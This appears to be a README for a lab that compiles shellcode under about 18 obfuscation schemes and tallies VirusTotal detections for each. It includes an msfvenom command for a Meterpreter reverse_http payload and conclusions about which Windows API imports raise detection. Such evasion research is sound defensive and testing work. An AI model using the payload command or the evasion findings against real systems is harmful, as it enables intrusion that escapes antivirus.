# SOL ShellcodeObfuscationLab

Shellcode obfuscations laboratory based on RedSiege [Chromatophore](https://github.com/RedSiege/Chromatophore/). 


## Results

Tests have been performed with einer "random" - a alphanumeric 20 byte string. And "Metasploit" 
with output of `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o beacon.bin`. 
The "Metasploit" does not execute the shellcode, only decodes and prints it. 

Conclusion: 
* Encoding/Encryption doesnt matter
* More important is if a windows API is being used/imported (IAT in PE)
* Note that NO obfuscation metasploit outperforms AES encryption, base64 windows api, ip-, mac- and uuid-encoding.


| **What**           | **Library**           | **Includes**              | **Function / IAT**                 | **Random** | **Metasploit** |
| ------------------ | --------------------- | ------------------------- | ---------------------------------- | ---------- | -------------- |
| aes                | crypt32.lib, advapi32 | wincrypt.h                | Crypt\*                            | 5          | 6              |
| base64             | \-                    | \-                        | \-                                 | 3          | 3              |
| base64api          | crypt32.lib           | wincrypt.h                | CryptStringToBinaryA               | 5          | 6              |
| bin2ip             | Ntdll.lib             | ntstatus.h<br>Ip2string.h | RtlIpv4StringToAddressA            | 8          | 10             |
| bin2mac            | Ntdll.lib             | ntstatus.h<br>Ip2string.h | RtlEthernetStringToAddressA        | 8          | 18             |
| cesar              | \-                    | \-                        | \-                                 | 2          | 2              |
| jargon             | \-                    | \-                        | \-                                 | 3          | 2              |
| jigsaw             | \-                    | \-                        | \-                                 | 2          | 3              |
| offset             | \-                    | \-                        | \-                                 | 2          | 3              |
| rc4api             | \-                    | \-                        | GetProcAddress (SystemFunction033) | 2          | 2              |
| reverse_byte_order | \-                    | \-                        | \-                                 | 2          | 2              |
| reverse_hex_string | \-                    | \-                        | \-                                 | 2          | 2              |
| twoarray           | \-                    | \-                        | \-                                 | 2          | 3              |
| uuidapi            | rpcrt4.lib            | rpc.h                     | UuidFromStringA                    | 8          | 11             |
| xor_multibyte      | \-                    | \-                        | \-                                 | 1          | 2              |
| xor_reverse        | \-                    | \-                        | \-                                 | 2          | 3              |
| xor_single         | \-                    | \-                        | \-                                 | 1          | 3              |
| NO OBFUSCATION     | \-                    | \-                        | \-                                 | 2          | 3              |
## Usage

Use the `x64 native tools command prompt` from Visual Studio
so you have access to `ml.exe` and `Windows.h`. 

To compile all the source into `output/*.exe`:
```
> python.exe sol.py compile
```

To send it to VirusTotal

```
> set VT_API_KEY=123...
> python.exe sol.py 
```

Output is in `output/*.exe.json` and `output/scan_results.txt`. 


